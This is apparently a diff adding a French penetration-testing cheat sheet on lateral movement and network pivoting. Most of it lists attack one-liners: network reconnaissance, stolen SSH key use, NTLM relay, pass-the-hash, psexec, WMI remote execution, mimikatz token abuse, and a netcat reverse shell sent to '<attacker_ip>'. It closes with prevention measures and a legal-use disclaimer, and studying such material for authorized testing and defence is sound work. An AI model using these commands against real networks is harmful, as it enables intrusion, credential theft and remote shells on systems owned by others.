@@ -1,0 +1,161 @@
+
+
+cheat sheet - Mouvement latéral (Pivoting)
+
+Ce document détaille les techniques de mouvement latéral dans un réseau, à des fins éducatives et légales uniquement.
+
+
+1. Comprendre le mouvement latéral
+
+Le mouvement latéral consiste à naviguer dans un réseau après une compromission initiale pour atteindre d’autres systèmes ou données sensibles.
+
+Aspect : Objectif
+Description : Accéder à des cibles critiques (ex. : DC, DB)
+
+Aspect : Prérequis
+Description : Accès initial à une machine compromise
+
+Aspect : Moyen
+Description : Exploitation de creds, services, ou réseau
+
+2. Techniques de mouvement latéral (Linux)
+
+Reconnaissance
+
+Commande : ifconfig; ip a
+Description : Récupère les interfaces réseau
+
+Commande : arp -n
+Description : Liste les hôtes dans le cache ARP
+
+Commande : netstat -tulnp
+Description : Identifie les ports/services actifs
+
+Commande : cat /etc/hosts
+Description : Liste les hôtes connus
+
+Commande : nmap -sn 192.168.1.0/24
+Description : Scan réseau pour hôtes actifs
+
+Exploitation
+
+Technique : SSH pivoting
+Exemple : ssh -D 9050 user@target
+Description : Crée un proxy SOCKS via SSH
+
+Technique : Pass-the-Key
+Exemple : ssh user@target -i stolen_key
+Description : Utilise une clé SSH volée
+
+Technique : SMB relay
+Exemple : impacket-ntlmrelayx -tf targets.txt
+Description : Relaye NTLM vers une autre cible
+
+Technique : Reverse shell
+Exemple : nc -e /bin/sh <attacker_ip> 4444
+Description : Envoie un shell à l’attaquant
+
+Technique : Exploitation service
+Exemple : msf: exploit/ssh_login
+Description : Exploite un service vulnérable
+
+3. Techniques de mouvement latéral (Windows)
+
+Reconnaissance
+
+Commande : ipconfig /all
+Description : Récupère les configs réseau
+
+Commande : arp -a
+Description : Liste les hôtes dans le cache ARP
+
+Commande : net view
+Description : Liste les machines du domaine
+
+Commande : netstat -ano
+Description : Identifie les ports/services actifs
+
+Commande : ping 192.168.1.1-254
+Description : Vérifie les hôtes actifs
+
+Exploitation
+
+Technique : Pass-the-Hash
+Exemple : pth-winexe -U <hash> <target>
+Description : Utilise un hash NTLM
+
+Technique : PSExec
+Exemple : psexec.py domain/user@<target>
+Description : Exécute une commande via SMB
+
+Technique : WMI
+Exemple : wmic /node:<target> process call create "cmd"
+Description : Lance une commande à distance
+
+Technique : RDP
+Exemple : xfreerdp /u:user /p:pass /v:<target>
+Description : Connexion RDP avec creds
+
+Technique : Token stealing
+Exemple : mimikatz: sekurlsa::pth
+Description : Utilise un jeton pour accès
+
+4. Pivoting réseau
+
+Technique : SOCKS Proxy
+Exemple : ssh -D 9050 user@<pivot>
+Description : Tunnel via proxy SOCKS
+
+Technique : Port Forwarding
+Exemple : ssh -L 445:<target>:445 <pivot>
+Description : Redirige un port local
+
+Technique : Reverse Port Forwarding
+Exemple : ssh -R 4444:<attacker>:4444 <pivot>
+Description : Redirige un port distant
+
+Technique : Meterpreter pivot
+Exemple : msf: route add <subnet>
+Description : Ajoute une route dans Metasploit
+
+Technique : Proxychains
+Exemple : proxychains nmap <target>
+Description : Utilise un proxy pour scan
+
+5. Préventions
+
+Moyen : Segmentation réseau
+Explication : Limiter les connexions entre machines
+
+Moyen : Désactiver services inutiles
+Explication : Réduire les points d’entrée (ex. : SMB, RDP)
+
+Moyen : Authentification forte
+Explication : MFA pour bloquer le vol de creds
+
+Moyen : Surveiller le trafic
+Explication : Détecter les scans ou connexions suspectes
+
+Moyen : Restreindre creds
+Explication : Ne pas réutiliser les mots de passe
+
+Moyen : Désactiver LLMNR/NBNS
+Explication : Prévenir les relais NTLM
+
+Moyen : Pare-feu strict
+Explication : Bloquer les ports non nécessaires
+
+Moyen : Journalisation
+Explication : Tracer les connexions et commandes
+
+Moyen : Mettre à jour systèmes
+Explication : Corriger les failles exploitables
+
+Moyen : Sensibilisation
+Explication : Former les utilisateurs aux risques
+
+6. Précautions
+
+- Usage légal : Tests uniquement sur réseaux autorisés.
+- Outils : Metasploit, Impacket, Proxychains, Nmap pour automatisation.
+- Isolation : Tester dans un lab sécurisé.
